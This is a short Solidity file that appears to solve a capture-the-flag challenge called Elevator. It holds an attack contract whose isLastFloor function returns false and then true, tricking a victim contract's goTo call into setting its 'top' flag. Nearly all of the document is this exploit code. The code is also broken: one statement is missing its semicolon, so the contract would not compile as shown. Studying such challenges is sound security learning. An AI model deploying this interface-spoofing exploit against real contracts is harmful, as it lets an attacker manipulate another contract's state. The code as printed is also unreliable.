
/**
In Elevator.sol, for top to be true, we need the isLastFloor function to return false
the first time it is called, and true the second time (no matter the value of the input param).
Therefore, we build such a function in this contract.
The attack function is implemented to call the victim contract's goTo function from this contract.
*/


pragma solidity ^0.6.0;

contract AttackElevator  {
    bool public top = true; 
    
    function isLastFloor(uint) public returns(bool) {
        top = !top
        return top;
    }
    
    function forceTopFloor(address _victim) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 2);
        (bool success, ) = address(_victim).call(payload);
    }
   
}


